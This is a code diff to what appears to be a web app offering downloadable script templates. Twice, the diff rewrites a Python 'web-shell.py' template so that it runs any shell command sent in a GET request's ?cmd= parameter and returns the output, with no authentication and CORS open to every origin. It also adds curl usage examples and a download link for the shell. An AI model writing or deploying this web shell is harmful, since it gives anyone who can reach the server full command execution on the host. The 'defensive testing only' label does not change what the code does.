@@ -530,7 +530,7 @@ echo "=== Service Probe Complete ==="
 echo "Scan finished: $(date)"`,
 
   'web-shell': `#!/usr/bin/env python3
-# Simple Command API Server
+# Simple Command API Server - GET Request Version
 # FOR DEFENSIVE SECURITY TESTING ONLY
 
 import http.server
@@ -538,70 +538,74 @@ import socketserver
 import subprocess
 import json
 import os
+import urllib.parse
 
 class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
-    def do_OPTIONS(self):
-        """Handle CORS preflight requests"""
-        self.send_response(200)
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
-        self.end_headers()
-    
-    def do_POST(self):
-        """Handle command execution"""
-        if self.path == '/api/command':
+    def do_GET(self):
+        """Handle command execution via GET request"""
+        # Parse URL and query parameters
+        parsed_url = urllib.parse.urlparse(self.path)
+        
+        if parsed_url.path == '/api/command':
+            # Get command from query parameter
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+            command = query_params.get('cmd', [''])[0].strip()
+            
+            if not command:
+                self.send_json_response({'error': 'No command provided. Use ?cmd=your_command'}, 400)
+                return
+            
+            # Execute command
             try:
-                # Read request data
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data.decode('utf-8'))
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
                 
-                command = data.get('command', '').strip()
-                if not command:
-                    self.send_json_response({'error': 'No command provided'}, 400)
-                    return
+                # Combine stdout and stderr
+                output = result.stdout
+                if result.stderr:
+                    output += result.stderr
                 
-                # Execute command
-                try:
-                    result = subprocess.run(
-                        command,
-                        shell=True,
-                        capture_output=True,
-                        text=True,
-                        timeout=30
-                    )
-                    
-                    # Combine stdout and stderr
-                    output = result.stdout
-                    if result.stderr:
-                        output += result.stderr
-                    
-                    response_data = {
-                        'command': command,
-                        'output': output or '(No output)',
-                        'return_code': result.returncode,
-                        'success': result.returncode == 0
-                    }
-                    
-                    self.send_json_response(response_data)
-                    
-                except subprocess.TimeoutExpired:
-                    self.send_json_response({
-                        'error': 'Command timed out (30s limit)',
-                        'command': command
-                    }, 408)
+                response_data = {
+                    'command': command,
+                    'output': output or '(No output)',
+                    'return_code': result.returncode,
+                    'success': result.returncode == 0
+                }
                 
-                except Exception as e:
-                    self.send_json_response({
-                        'error': f'Execution error: {str(e)}',
-                        'command': command
-                    }, 500)
-                    
-            except json.JSONDecodeError:
-                self.send_json_response({'error': 'Invalid JSON'}, 400)
+                self.send_json_response(response_data)
+                
+            except subprocess.TimeoutExpired:
+                self.send_json_response({
+                    'error': 'Command timed out (30s limit)',
+                    'command': command
+                }, 408)
+            
             except Exception as e:
-                self.send_json_response({'error': f'Request error: {str(e)}'}, 500)
+                self.send_json_response({
+                    'error': f'Execution error: {str(e)}',
+                    'command': command
+                }, 500)
+        
+        elif parsed_url.path == '/':
+            # Simple info page
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.end_headers()
+            
+            html = f"""
+            <h1>🔧 Simple Command API</h1>
+            <p><strong>Endpoint:</strong> <code>/api/command?cmd=YOUR_COMMAND</code></p>
+            <p><strong>Example:</strong> <a href="/api/command?cmd=pwd">/api/command?cmd=pwd</a></p>
+            <p><strong>Working Directory:</strong> {os.getcwd()}</p>
+            <p style="color: red;"><strong>⚠️ WARNING:</strong> Only use on trusted networks!</p>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        
         else:
             self.send_json_response({'error': 'Endpoint not found'}, 404)
     
@@ -610,25 +614,24 @@ class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
         self.send_response(status_code)
         self.send_header('Content-Type', 'application/json')
         self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
         self.end_headers()
-        self.wfile.write(json.dumps(data).encode('utf-8'))
+        self.wfile.write(json.dumps(data, indent=2).encode('utf-8'))
     
     def log_message(self, format, *args):
         """Simple logging"""
         print(f"[{self.date_time_string()}] {format % args}")
 
 def main():
-    PORT = int(os.environ.get('PORT', 8080))
+    PORT = int(os.environ.get('PORT', 8881))
     
-    print("🔧 Simple Command API Server")
+    print("🔧 Simple Command API Server (GET)")
     print(f"📡 Starting on port {PORT}")
     print(f"📍 Working directory: {os.getcwd()}")
-    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command")
-    print("\n📝 Usage:")
-    print("  POST /api/command")
-    print('  Body: {"command": "ls -la"}')
+    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command?cmd=COMMAND")
+    print("\n📝 Usage Examples:")
+    print(f"  http://localhost:{PORT}/api/command?cmd=pwd")
+    print(f"  http://localhost:{PORT}/api/command?cmd=ls%20-la")
+    print(f"  curl 'http://localhost:{PORT}/api/command?cmd=whoami'")
     print("\n⚠️  WARNING: Only use on trusted networks!")
     
     try:
@@ -1332,7 +1335,7 @@ echo "=== Complete ==="\`;
 
 function loadWebShellTemplate() {
     const template = \`#!/usr/bin/env python3
-# Simple Command API Server
+# Simple Command API Server - GET Request Version
 # FOR DEFENSIVE SECURITY TESTING ONLY
 
 import http.server
@@ -1340,70 +1343,74 @@ import socketserver
 import subprocess
 import json
 import os
+import urllib.parse
 
 class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
-    def do_OPTIONS(self):
-        """Handle CORS preflight requests"""
-        self.send_response(200)
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
-        self.end_headers()
-    
-    def do_POST(self):
-        """Handle command execution"""
-        if self.path == '/api/command':
+    def do_GET(self):
+        """Handle command execution via GET request"""
+        # Parse URL and query parameters
+        parsed_url = urllib.parse.urlparse(self.path)
+        
+        if parsed_url.path == '/api/command':
+            # Get command from query parameter
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+            command = query_params.get('cmd', [''])[0].strip()
+            
+            if not command:
+                self.send_json_response({'error': 'No command provided. Use ?cmd=your_command'}, 400)
+                return
+            
+            # Execute command
             try:
-                # Read request data
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data.decode('utf-8'))
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
                 
-                command = data.get('command', '').strip()
-                if not command:
-                    self.send_json_response({'error': 'No command provided'}, 400)
-                    return
+                # Combine stdout and stderr
+                output = result.stdout
+                if result.stderr:
+                    output += result.stderr
                 
-                # Execute command
-                try:
-                    result = subprocess.run(
-                        command,
-                        shell=True,
-                        capture_output=True,
-                        text=True,
-                        timeout=30
-                    )
-                    
-                    # Combine stdout and stderr
-                    output = result.stdout
-                    if result.stderr:
-                        output += result.stderr
-                    
-                    response_data = {
-                        'command': command,
-                        'output': output or '(No output)',
-                        'return_code': result.returncode,
-                        'success': result.returncode == 0
-                    }
-                    
-                    self.send_json_response(response_data)
-                    
-                except subprocess.TimeoutExpired:
-                    self.send_json_response({
-                        'error': 'Command timed out (30s limit)',
-                        'command': command
-                    }, 408)
+                response_data = {
+                    'command': command,
+                    'output': output or '(No output)',
+                    'return_code': result.returncode,
+                    'success': result.returncode == 0
+                }
                 
-                except Exception as e:
-                    self.send_json_response({
-                        'error': f'Execution error: {str(e)}',
-                        'command': command
-                    }, 500)
-                    
-            except json.JSONDecodeError:
-                self.send_json_response({'error': 'Invalid JSON'}, 400)
+                self.send_json_response(response_data)
+                
+            except subprocess.TimeoutExpired:
+                self.send_json_response({
+                    'error': 'Command timed out (30s limit)',
+                    'command': command
+                }, 408)
+            
             except Exception as e:
-                self.send_json_response({'error': f'Request error: {str(e)}'}, 500)
+                self.send_json_response({
+                    'error': f'Execution error: {str(e)}',
+                    'command': command
+                }, 500)
+        
+        elif parsed_url.path == '/':
+            # Simple info page
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.end_headers()
+            
+            html = f"""
+            <h1>🔧 Simple Command API</h1>
+            <p><strong>Endpoint:</strong> <code>/api/command?cmd=YOUR_COMMAND</code></p>
+            <p><strong>Example:</strong> <a href="/api/command?cmd=pwd">/api/command?cmd=pwd</a></p>
+            <p><strong>Working Directory:</strong> {os.getcwd()}</p>
+            <p style="color: red;"><strong>⚠️ WARNING:</strong> Only use on trusted networks!</p>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        
         else:
             self.send_json_response({'error': 'Endpoint not found'}, 404)
     
@@ -1412,10 +1419,8 @@ class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
         self.send_response(status_code)
         self.send_header('Content-Type', 'application/json')
         self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
         self.end_headers()
-        self.wfile.write(json.dumps(data).encode('utf-8'))
+        self.wfile.write(json.dumps(data, indent=2).encode('utf-8'))
     
     def log_message(self, format, *args):
         """Simple logging"""
@@ -1424,13 +1429,14 @@ class CommandAPIHandler(http.server.BaseHTTPRequestHandler):
 def main():
     PORT = int(os.environ.get('PORT', 8080))
     
-    print("🔧 Simple Command API Server")
+    print("🔧 Simple Command API Server (GET)")
     print(f"📡 Starting on port {PORT}")
     print(f"📍 Working directory: {os.getcwd()}")
-    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command")
-    print("\\n📝 Usage:")
-    print("  POST /api/command")
-    print('  Body: {"command": "ls -la"}')
+    print(f"🌐 API endpoint: http://localhost:{PORT}/api/command?cmd=COMMAND")
+    print("\\n📝 Usage Examples:")
+    print(f"  http://localhost:{PORT}/api/command?cmd=pwd")
+    print(f"  http://localhost:{PORT}/api/command?cmd=ls%20-la")
+    print(f"  curl 'http://localhost:{PORT}/api/command?cmd=whoami'")
     print("\\n⚠️  WARNING: Only use on trusted networks!")
     
     try:
@@ -1448,7 +1454,7 @@ if __name__ == "__main__":
     
     document.getElementById('scriptContent').value = template;
     document.getElementById('scriptName').value = 'web-shell.py';
-    log('Simple Command API template loaded', 'success');
+    log('Simple Command API (GET) template loaded', 'success');
 }
 
 // Initialize when DOM is loaded
@@ -1722,7 +1728,7 @@ export default {
             </li>
             <li class="file-item">
                 <a href="/files/web-shell" class="file-link" style="color: #9c27b0; font-weight: bold;">🐍 web-shell.py</a>
-                <div class="file-desc">Simple command API server - POST commands to /api/command and get results</div>
+                <div class="file-desc">Simple command API server - GET /api/command?cmd=YOUR_COMMAND for instant results</div>
             </li>
             <li class="file-item">
                 <a href="/files/basic-info" class="file-link">basic-info.sh</a>
